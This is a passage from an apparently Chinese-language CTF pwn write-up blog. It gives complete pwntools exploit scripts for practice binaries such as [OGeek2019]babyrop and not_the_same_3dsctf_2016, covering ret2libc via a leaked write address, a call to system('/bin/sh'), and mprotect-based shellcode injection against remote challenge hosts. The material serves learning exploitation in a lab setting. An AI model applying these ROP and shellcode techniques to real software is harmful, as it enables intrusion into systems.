bin_sh=libc_base + libc.dump('str_bin_sh')
print(libc_base)
print(&quot;libc base: &quot;, hex(libc_base))
print(&quot;system address: &quot;, hex(sys_addr))

#2.get shell
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(ret_addr) + p64(pop_rdi)  + p64(bin_sh) + p64(sys_addr)
p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline('1')
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<h2 id="题目未提供libc">题目未提供libc</h2>
<h3 id="libcsearcher-的使用">LibcSearcher 的使用</h3>
<h4 id="font-coloryellowgreenogeek2019babyropfont"><font color=YellowGreen>[OGeek2019]babyrop</font>🐾</h4>
<p><a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/%5BOGeek2019%5Dbabyrop">题目链接</a></p>
<p>🤐<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>from pwn import *
from LibcSearcher import *

p = remote(&quot;node4.buuoj.cn&quot;,25172)
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./pwn&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)

#libc_base 
main_addr = 0x8048825
write_plt = elf.plt[&quot;write&quot;]
write_got = elf.got[&quot;write&quot;]

#1.strcmp v1 = 0
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

#2.Get write address
payload = b'a' * (0xe7+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #main_addr作为返回地址，构造write（1,read_got,4）
p.sendline(payload)
write_addr = u32(p.recv(4))
print(&quot;*****write: &quot;,hex(write_addr))

libc_base = write_addr - libc.symbols[&quot;write&quot;]
sys_addr = libc_base + libc.symbols[&quot;system&quot;]
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
print(&quot;*****libc_base: &quot;,hex(libc_base))
print(&quot;*****sys_addr: &quot;,hex(sys_addr))
print(&quot;*****bin_sh: &quot;,hex(bin_sh))

#3.get shell
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

payload = b'a' * (0xe7+0x4)  + p32(sys_addr) + p32(1) + p32(bin_sh)
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<p>两种互通，就算无可自己补libc</p>
<blockquote>
<p>相似pwn：<br>
ret2sys  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/level2"><font color=YellowGreen>level2</font></a><br>
ret2sys+栈对齐  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/level2_x64"><font color=YellowGreen>level2_x64</font></a><br>
<code>$find -name flag</code> getshell之后查找flag文件  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/babyrop"><font color=YellowGreen>babyrop</font></a></p>
</blockquote>
<hr>
<h3 id="静态链接">静态链接</h3>
<h4 id="font-coloryellowgreennot_the_same_3dsctf_2016font"><font color=YellowGreen>not_the_same_3dsctf_2016</font> 🐾</h4>
<p><font color=CornflowerBlue>_dl_make_stack_executable方法</font><br>
<a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/not_the_same_3dsctf_2016">题目链接</a><br>
🤐<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>from pwn import *

elf = ELF('./not_the_same_3dsctf_2016')
p = remote('node4.buuoj.cn', 26172)
#p = process('./not_the_same_3dsctf_2016')

#1.获取 mprotect() 函数相关信息
#int mprotect(void *addr, size_t len, int prot);
#addr 内存启始地址; len  修改内存的长度 ; prot 内存的权限;
pop3_ret = 0x0804f420 #取三个寄存器 0x0804f420 : pop ebx ; pop esi ; pop ebp ; ret
#压入三个参数
mem_addr = 0x080EB000
mem_len = 0x1000
mem_prot = 0x7

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']

payload = b'a' * 45
payload += p32(mprotect_addr)
payload += p32(pop3_ret) 


payload += p32(mem_addr) 
payload += p32(mem_len)  
payload += p32(mem_prot)   

#2.返回地址填上read函数，我们接下来要将shellcode读入程序段
payload += p32(read_addr)
#ssize_t read(int fd, void *buf, size_t count);
#fd 设为0时就可以从输入端读取内容    设为0
#buf 设为我们想要执行的内存地址      设为我们已找到的内存地址0x80EB000
#size 适当大小就可以               只要够读入shellcode就可以，设置大点无所谓
payload += p32(pop3_ret)
#read()的三个参数 
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x100)

payload += p32(mem_addr)   

p.sendline(payload)
#已完成了修改内存为可读可写可执行，将程序重定向到了修改好后的内存地址，传入shellcode
payload = asm(shellcraft.sh()) 
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<blockquote>
<p>相似pwn：<br>
<a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/get_started_3dsctf_2016"><font color=YellowGreen>get_started_3dsctf_2016</font></a></p>
</blockquote>
<p>注意:上述三篇exp（前两篇VS后一篇的差异），前重在理解逻辑，后更能反应程序中栈变化。另<a href="">模板化的exp</a></p>
<p>😎自此，开启我的博客~</p>
]]></content>
    </entry>
</feed>